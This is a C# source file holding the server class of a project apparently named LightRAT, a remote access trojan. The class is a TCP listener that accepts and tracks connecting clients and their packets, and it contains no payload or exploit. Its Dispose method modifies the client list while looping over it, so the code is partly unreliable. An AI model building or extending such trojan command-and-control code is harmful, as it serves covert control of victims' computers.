﻿using System;
using System.Net;
using System.Net.Sockets;
using LightRAT.Core.Data;using System.Collections.Generic;

using LightRAT.Core.Network.Packets;

namespace LightRAT.Core.Network
{
    public class Server : IDisposable
    {
        private readonly object _clientStateChangedLock = new object();

        public IPEndPoint ServerEndPoint { get; set; }
        public Socket InternalSocket { get; } = new Socket(AddressFamily.InterNetwork ,SocketType.Stream, ProtocolType.Tcp);
        public List<Client> ConnectedClients { get; private set; } = new List<Client>();
        public List<Account> AllowedAccounts { get; private set; } = new List<Account>();
        public bool IsDisposed { get; private set; }

        public delegate void ReceiveDataEventHandler(Server server, Client client, IPacket packet);
        public event ReceiveDataEventHandler ClientReceiveDataEvent;

        public delegate void StateChangeEventHandler(Server server, Client client, ClientState state);
        public event StateChangeEventHandler ClientStateChangeEvent;

        public Server(string ip, int port, Account account)
        {
            ServerEndPoint = new IPEndPoint(IPAddress.Parse(ip), port);
            AllowedAccounts.Add(account);
        }

        public void Start()
        {
            try
            {
                InternalSocket.Bind(ServerEndPoint);
                InternalSocket.Listen(500);
                InternalSocket.BeginAccept(EndAccepting, null);
            }
            catch (SocketException ex)
            {
                if (ex.ErrorCode == (int)SocketError.AddressAlreadyInUse)
                    throw new InvalidOperationException("The selected port is already used by another process");
                else
                    throw new NotSupportedException("oops unexpected error was thrown please report this issue to the developer.");
            }  
        }
        private void EndAccepting(IAsyncResult result)
        {
            var client = new Client(InternalSocket.EndAccept(result));
            AddClient(client);
            client.StartReceive();
            InternalSocket.BeginAccept(EndAccepting, null);
        }

        public void AddClient(Client client)
        {
            lock (_clientStateChangedLock)
            {
                client.ReceiveDataEvent += OnClientReceive;
                client.StateChangeEvent += OnClientStateChange; ;
                ConnectedClients.Add(client);
            }
        }
        public void RemoveClient(Client client)
        {
            lock (_clientStateChangedLock)
            {
                client.ReceiveDataEvent -= OnClientReceive;
                client.StateChangeEvent -= OnClientStateChange;
                ConnectedClients.Remove(client);
                client.Dispose();
            }
        }


        private void OnClientReceive(Client client, IPacket packet)
        {
            ClientReceiveDataEvent?.Invoke(this, client, packet);
        }
        private void OnClientStateChange(Client client, ClientState state)
        {
            ClientStateChangeEvent?.Invoke(this, client, state);
        }

        public void Dispose()
        {
            if (!IsDisposed)
            {
                ServerEndPoint = null;
                InternalSocket.Disconnect(false);
                InternalSocket.Shutdown(SocketShutdown.Both);
                InternalSocket.Dispose();

                foreach (var client in ConnectedClients)
                    RemoveClient(client);

                AllowedAccounts.RemoveRange(0, AllowedAccounts.Count);

                AllowedAccounts = null;
                ConnectedClients = null;
                IsDisposed = true;
            }
        }
    }
}
